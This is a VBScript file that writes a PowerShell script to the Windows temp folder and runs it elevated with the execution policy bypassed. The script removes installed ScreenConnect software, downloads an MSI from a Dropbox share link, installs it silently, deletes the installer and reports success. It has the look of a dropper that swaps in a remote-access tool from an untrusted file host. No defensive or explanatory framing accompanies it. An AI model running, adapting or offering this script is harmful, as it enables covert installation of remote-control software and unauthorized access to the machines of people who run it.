Set objShell = CreateObject("Shell.Application")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile(objFSO.GetSpecialFolder(2) & "\iv.ps1", True)

objFile.WriteLine "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
objFile.WriteLine ""
objFile.WriteLine """Starting uninstall process..."""
objFile.WriteLine "Get-WmiObject -Class Win32_Product | Where-Object {$_.Name -like '*ScreenConnect*'} | ForEach-Object { $_.Uninstall() }"
objFile.WriteLine ""
objFile.WriteLine """Downloading and installing new version..."""
objFile.WriteLine "Invoke-WebRequest -Uri ""https://www.dropbox.com/scl/fi/rh2eyrdc0qwophaz4j9mc/CSM.msi?rlkey=26of9mzgo01y4hfg3uwi2rxs3&st=c22qtz3e&dl=1"" -OutFile """ & objFSO.GetSpecialFolder(2) & "\hm.msi"""
objFile.WriteLine "Start-Process msiexec -ArgumentList ""/i"", """ & objFSO.GetSpecialFolder(2) & "\hm.msi"", ""/qn"", ""/norestart"" -Wait"
objFile.WriteLine "Remove-Item """ & objFSO.GetSpecialFolder(2) & "\hm.msi"" -ErrorAction SilentlyContinue"
objFile.WriteLine """Process completed successfully"""
objFile.WriteLine ""
objFile.WriteLine """Timeout for 5 seconds before auto-close..."""
objFile.WriteLine "Start-Sleep -Seconds 5"

objFile.Close

objShell.ShellExecute "powershell", "-ExecutionPolicy Bypass -File """ & objFSO.GetSpecialFolder(2) & "\iv.ps1""", "", "runas", 1